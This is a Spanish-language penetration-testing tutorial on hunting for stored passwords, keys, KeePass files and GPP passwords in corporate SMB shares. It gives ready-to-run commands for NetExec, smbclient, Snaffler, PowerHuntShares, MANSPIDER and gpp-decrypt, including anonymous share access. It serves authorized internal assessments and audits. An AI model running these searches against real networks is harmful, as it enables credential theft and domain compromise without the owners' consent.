# Búsqueda de Credenciales en Recursos Compartidos de Red

Los shares SMB en entornos corporativos acumulan décadas de scripts, configuraciones, backups y documentación. Es frecuente encontrar contraseñas hardcodeadas en scripts de automatización, archivos de configuración y hojas de cálculo que los administradores dejaron en carpetas compartidas. En muchos engagements internos, esta búsqueda da acceso a credenciales críticas sin explotar ninguna vulnerabilidad técnica.

### Estrategia de búsqueda

Antes de lanzar herramientas automatizadas, conviene definir qué buscar para reducir falsos positivos y priorizar los shares más valiosos:

* Buscar palabras clave dentro de archivos: `passw`, `user`, `token`, `key`, `secret`
* Priorizar extensiones asociadas a credenciales: `.ini`, `.cfg`, `.env`, `.xlsx`, `.ps1`, `.bat`
* Buscar archivos con nombres reveladores: `config`, `user`, `passw`, `cred`, `initial`
* Adaptar las keywords al idioma del objetivo — una empresa española usará `contraseña`, una alemana `Benutzer` o `Kennwort`
* Priorizar shares de IT y sysadmin sobre shares de fotografías o marketing — el tiempo es limitado y diez shares con miles de archivos cada uno requieren horas
* Empezar con búsquedas manuales básicas antes de escalar a herramientas pesadas

### Enumeración de shares accesibles

```bash
# NetExec — listar shares con credenciales de usuario de dominio
netexec smb 192.168.1.0/24 -u usuario -p Password123 --shares

# Impacket — listar shares
impacket-smbclient DOMINIO/usuario:Password123@192.168.1.10
# Dentro del cliente: shares / ls / get archivo

# smbclient directo
smbclient -L //192.168.1.10 -U usuario%Password123
smbclient //192.168.1.10/NETLOGON -U usuario%Password123
```

### Búsqueda manual con PowerShell

```powershell
# Buscar archivos por extensión y contenido en un share
Get-ChildItem -Recurse -Include *.ps1,*.bat,*.xml,*.ini,*.cfg,*.env \\DC01\IT |
  Select-String -Pattern "passw","password","secret","token" |
  Select-Object Path, LineNumber, Line
```

### Montar shares para búsqueda masiva (Linux)

```bash
# Montar share en Linux
sudo mount -t cifs //192.168.1.10/Compartido /mnt/share \
  -o username=usuario,password=Password123,domain=EMPRESA

# Buscar ficheros con credenciales en el share montado
grep -r "password\|passwd\|secret\|token\|api_key" /mnt/share/ 2>/dev/null \
  --include="*.txt" --include="*.xml" --include="*.ini" \
  --include="*.conf" --include="*.ps1" --include="*.bat" \
  --include="*.csv" --include="*.xlsx" -l
```

### Snaffler — búsqueda automatizada desde Windows

Snaffler es la herramienta más completa para escanear shares en entornos Active Directory. Ejecutada desde un host unido al dominio, enumera automáticamente todos los shares accesibles y busca patrones de credenciales, claves y certificados. Clasifica los hallazgos por severidad: **Red** (crítico), **Yellow** (interesante), **Green** (revisión manual).

```cmd
# Búsqueda básica — descubre y escanea todos los shares del dominio
Snaffler.exe -s

# Con output a fichero
Snaffler.exe -s -d dominio.local -o snaffler.log -v data

# Filtrar por servidor específico
Snaffler.exe -s -n dc01.dominio.local -o snaffler.log

# Buscar referencias a usuarios de AD en archivos
Snaffler.exe -s -u

# Especificar shares concretos
Snaffler.exe -s -i \\DC01\IT,\\DC01\Finance
```

Snaffler detecta automáticamente: contraseñas en `.ps1`, `.bat`, `.cmd`, cadenas de conexión en `web.config`, archivos KeePass (`.kdbx`), claves privadas SSH y certificados PFX, hashes en archivos de configuración y GPP passwords en SYSVOL.

### PowerHuntShares — informe HTML desde Windows

PowerHuntShares es un script PowerShell que no requiere máquina unida al dominio y genera un **informe HTML** con los resultados, lo que facilita la revisión posterior. Especialmente útil para auditorías donde se necesita documentar el alcance de la exposición.

```powershell
# Escaneo básico con 100 threads — output en directorio especificado
Invoke-HuntSMBShares -Threads 100 -OutputDirectory C:\Users\Public
```

El informe incluye: shares con permisos excesivos, archivos interesantes por categoría (crítico/alto/medio/bajo), timelines de último acceso y escritura, propietarios comunes y listados de directorios.

### MANSPIDER — búsqueda remota desde Linux

MANSPIDER permite escanear shares SMB directamente desde Linux sin necesitar acceso a un host Windows del dominio. La forma más fiable de ejecutarlo es con Docker para evitar problemas de dependencias:

```bash
# Instalar via Docker
docker pull blacklanternsecurity/manspider

# Escanear un host buscando archivos con "passw" en el contenido
docker run --rm -v ./manspider:/root/.manspider \
  blacklanternsecurity/manspider 192.168.1.10 \
  -c 'passw' -u 'usuario' -p 'Password123'

# Buscar por extensión de archivo
docker run --rm -v ./manspider:/root/.manspider \
  blacklanternsecurity/manspider 192.168.1.0/24 \
  -e ps1 bat xml config env \
  -u 'usuario' -p 'Password123'

# Combinar contenido y extensión
docker run --rm -v ./manspider:/root/.manspider \
  blacklanternsecurity/manspider 192.168.1.10 \
  -c 'password' -e xml config \
  -u 'usuario' -p 'Password123'
```

Los archivos que coincidan se descargan automáticamente a `./manspider/loot/`.

### NetExec spider — búsqueda integrada

NetExec incluye funcionalidad de spider para buscar contenido en shares sin herramientas adicionales:

```bash
# Buscar archivos con "passw" en el share IT
netexec smb 192.168.1.10 -u usuario -p Password123 \
  --spider IT --content --pattern "passw"

# Buscar en todos los shares accesibles
netexec smb 192.168.1.10 -u usuario -p Password123 \
  --spider C$ --content --pattern "password"

# Listar archivos por extensión
netexec smb 192.168.1.10 -u usuario -p Password123 \
  --spider IT --pattern "\.kdbx$"
```

### SYSVOL y NETLOGON

Los shares `SYSVOL` y `NETLOGON` son accesibles por defecto para cualquier usuario autenticado del dominio y contienen scripts de inicio de sesión y políticas de grupo:

```bash
# Acceder a SYSVOL
smbclient //dc01.dominio.local/SYSVOL -U usuario%Password123

# Buscar GPP passwords (archivos Groups.xml, Services.xml, etc.)
find /mnt/sysvol -name "Groups.xml" -o -name "Services.xml" \
  -o -name "Scheduledtasks.xml" -o -name "Printers.xml" 2>/dev/null

# Descifrar cpassword con gpp-decrypt
gpp-decrypt "cpassword_value"

# O con NetExec automáticamente
netexec smb dc01.dominio.local -u usuario -p Password123 -M gpp_password
```

### Shares con acceso anónimo

```bash
# Comprobar shares accesibles sin credenciales
netexec smb 192.168.1.0/24 -u '' -p '' --shares
smbclient -L //192.168.1.10 -N
smbclient //192.168.1.10/Publico -N
```

Los shares anónimos (`Everyone: Read`) son una misconfiguration frecuente en entornos corporativos que nunca revisaron los permisos del almacenamiento de ficheros.

### Tipos de archivos de mayor interés

| Extensión                     | Contenido potencial                                 |
| ----------------------------- | --------------------------------------------------- |
| `.ps1`, `.bat`, `.cmd`        | Scripts con credenciales hardcodeadas               |
| `.xml`, `.config`             | Configuraciones de aplicaciones y IIS               |
| `.ini`, `.conf`, `.env`       | Configuraciones de servicios y variables de entorno |
| `.kdbx`                       | Base de datos KeePass                               |
| `.pfx`, `.p12`                | Certificados con clave privada                      |
| `.pem`, `.key`                | Claves privadas SSH/TLS                             |
| `.xls`, `.xlsx`, `.csv`       | Inventarios de contraseñas o activos                |
| `id_rsa`, `*.ppk`             | Claves SSH (PuTTY)                                  |
| `.vhd`, `.vmdk`               | Imágenes de disco — pueden contener SAM/NTDS        |
| `unattend.xml`, `sysprep.xml` | Contraseñas de despliegue                           |

### Resumen de herramientas

| Herramienta          | Plataforma                    | Mejor para                                                           |
| -------------------- | ----------------------------- | -------------------------------------------------------------------- |
| **Snaffler**         | Windows (unido al dominio)    | Escaneo completo del dominio, clasificación automática por severidad |
| **PowerHuntShares**  | Windows (no requiere dominio) | Informe HTML, auditoría documentada                                  |
| **MANSPIDER**        | Linux (Docker)                | Escaneo remoto sin acceso a Windows                                  |
| **NetExec spider**   | Linux                         | Búsqueda rápida integrada sin herramientas adicionales               |
| **smbclient + grep** | Linux                         | Inspección manual de shares específicos                              |

> En muchos entornos, el share `\\DC\SYSVOL` tiene scripts `.bat` de inicio de sesión creados hace años con `net use Z: \\servidor\recurso /user:DOMINIO\svcaccount Password123`. Ese tipo de credenciales de service accounts raramente se rotan.

> Las herramientas automatizadas generan muchos falsos positivos. Siempre se necesita revisión manual de los resultados. Priorizar los hallazgos **Red** de Snaffler y los archivos `.kdbx` — un gestor de contraseñas de un administrador puede contener acceso a toda la infraestructura.
